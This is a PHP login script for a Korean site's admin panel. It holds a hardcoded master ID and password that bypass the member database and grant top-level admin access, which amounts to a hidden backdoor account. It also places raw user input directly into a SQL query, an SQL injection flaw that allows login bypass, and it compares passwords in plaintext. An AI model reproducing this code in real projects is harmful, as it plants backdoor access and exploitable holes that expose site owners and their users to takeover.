<?
include "../inc/header.php";

if(!$login_id||!$login_pass){
	msg('아이디, 패스워드를 입력해 주세요.');
	exit;
}

if($login_id=="drg1038"&&$login_pass=="690920"){
	$_SESSION[login_id]=$login_id;
	$_SESSION[login_name]="우정넷";
	$_SESSION[login_idx]=999;
	$_SESSION[login_level]="10";
	parent_url("/manage/menu01/sub01.php");
}

$login_check=sql_fetch("select * from member_admin where admin_id='$login_id' and admin_pass='$login_pass' ");
if(!$login_check[idx]){
	msg('아이디, 패스워드를 확인해 주세요.');
	exit;
}else{
	$_SESSION[login_id]=$login_check[admin_id];
	$_SESSION[login_name]=$login_check[admin_name];
	$_SESSION[login_idx]=$login_check[idx];
	$_SESSION[login_level]=$login_check[admin_level];
	parent_url("/manage/menu01/sub01.php");
}
?>